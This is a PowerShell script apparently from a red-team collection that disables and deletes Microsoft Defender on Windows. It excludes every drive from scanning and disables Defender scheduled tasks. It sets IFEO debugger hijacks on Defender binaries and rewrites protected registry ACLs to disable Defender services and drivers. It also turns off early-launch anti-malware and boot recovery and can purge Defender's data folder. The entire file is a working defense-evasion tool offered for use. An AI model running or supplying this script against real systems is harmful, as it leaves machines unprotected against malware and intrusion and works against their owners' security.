<#
.SYNOPSIS
    RedTeamNotes: Native-Only Hardened Microsoft Defender Removal.
.DESCRIPTION
    Direct registry and filesystem manipulation via ACL hijacking.
    Targets services, drivers, scheduled tasks, and execution options.
#>

[CmdletBinding()]
param (
    [Parameter()]
    [Switch]$PurgeFiles
)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper: Take Ownership and Grant FullControl ---
function Grant-RegistryPermission {
    param([string]$Path)
    # Target: Grant 'Administrators' group full control over the registry key
    # Registry keys are often owned by TrustedInstaller; we must hijack the ACL
    $Acl = Get-Acl -Path $Path
    $Ar = New-Object System.Security.AccessControl.RegistryAccessRule(
        "Administrators", "FullControl", "Allow"
    )
    $Acl.SetAccessRule($Ar)
    try {
        Set-Acl -Path $Path -AclObject $Acl -ErrorAction Stop
    } catch {
        Write-Warning "    [!] Failed to set ACL for $Path. Verify Tamper Protection is OFF."
    }
}

# 1. Verification: Tamper Protection Check
$TPPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if ((Get-ItemProperty $TPPath).TamperProtection -ne 4) {
    Write-Host "[!] CRITICAL: Tamper Protection is active. Manual disablement required." -ForegroundColor Yellow
}

# 2. Step 1/5: FileSystem Exclusion (Native MpPreference)
Write-Host "[Step 1/5] Injecting global filesystem exclusions..."
67..90 | ForEach-Object {
    $Drive = [char]$_ + ":\"
    if (Test-Path $Drive) {
        Add-MpPreference -ExclusionPath $Drive -ErrorAction SilentlyContinue
    }
}

# 3. Step 2/5: Disable Scheduled Tasks (Persistence Prevention)
Write-Host "[Step 2/5] Neutralizing RedTeam-relevant Scheduled Tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 4. Step 3/5: IFEO Hijacking (Process Execution Block)
Write-Host "[Step 3/5] Applying IFEO redirection for Defender binaries..."
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe", "MpSigStub.exe")
foreach ($Bin in $Binaries) {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\${Bin}"
    if (-not (Test-Path $Key)) { New-Item $Key -Force | Out-Null }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d"
}

# 5. Step 4/5: Service Registry Hijacking (ACL-based)
Write-Host "[Step 4/5] Disabling Kernel Services and Drivers..."
$Services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $Services) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\${Svc}"
    if (Test-Path $RegPath) {
        # Perform ACL surgery to gain write access to protected keys
        Grant-RegistryPermission -Path $RegPath
        try {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction SilentlyContinue
            Write-Host "    [-] ${Svc}: Disabled" -ForegroundColor Gray
        } catch {
            Write-Host "    [X] ${Svc}: Failed (Access Denied)" -ForegroundColor Red
        }
    }
}

# 6. Step 5/5: Early Launch Anti-Malware (ELAM) & Recovery
Write-Host "[Step 5/5] Finalizing OS Hardening..."
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue
bcdedit /set {current} recoveryenabled No | Out-Null

if ($PurgeFiles) {
    Write-Host "[!] Purging Defender physical data structure..."
    $Target = "C:\ProgramData\Microsoft\Windows Defender"
    if (Test-Path $Target) {
        takeown /f $Target /r /d y | Out-Null
        icacls $Target /grant administrators:F /t | Out-Null
        Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "[#] RedTeamNotes: Native removal completed. SYSTEM REBOOT REQUIRED." -ForegroundColor Green
